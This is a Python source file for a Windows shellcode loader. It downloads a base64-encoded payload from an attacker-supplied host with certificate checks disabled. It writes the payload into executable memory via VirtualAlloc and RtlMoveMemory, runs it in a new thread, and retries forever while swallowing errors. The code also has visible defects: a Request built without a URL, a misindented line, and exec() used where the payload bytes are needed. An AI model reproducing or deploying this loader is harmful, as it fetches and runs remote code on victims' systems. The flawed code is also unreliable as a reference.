from gc import collect
from sys import argv
from contextlib import suppress
from ctypes import windll, pointer, c_uint64, c_char, c_int
from base64 import b64decode
from urllib.request import Request, urlopen
from ssl import create_default_context, CERT_NONE

payload_address = argv[1]

class Init: 
    def __init__(self):
        windll.kernel32.VirtualAlloc.restype = c_uint64 

        self.context = create_default_context()
        self.context.check_hostname = False
        self.context.verify_mode = CERT_NONE
        self.content = Request()
 self.content.add_header('Host', f'{payload_address}') 
        self.content.add_header('Accept-Encoding', 'gzip, deflate, br')
        self.content.add_header('Accept-Language', 'en-US;q=0.5,en;q=0.3')
        
    def load(self): 
        # payload is base64-encoded hexidecimal datagram
        payload = exec(b64decode(urlopen(self.content, context = self.context).read()))
        # memory allocation
        offset = windll.kernel32.VirtualAlloc(
            c_int(0), 
            c_int(len(payload)), 
            c_int(0x3000), c_int(0x40)
        )
        #injection
        windll.kernel32.RtlMoveMemory(
            c_uint64(offset), 
            (c_char * len(payload)).from_buffer(payload), 
            c_int(len(payload))
        )
        # payload now in memory, create thread
        handle = windll.kernel32.CreateThread(
            c_int(0), 
            c_int(0), 
            c_uint64(offset), 
            c_int(0), 
            c_int(0), 
            pointer(c_int(0))
        )

        collect()    
        windll.kernel32.WaitForSingleObject(c_int(handle), c_int(-1))

if __name__ == '__main__':
    while True: 
        with suppress(Exception):
            Init().load()
            
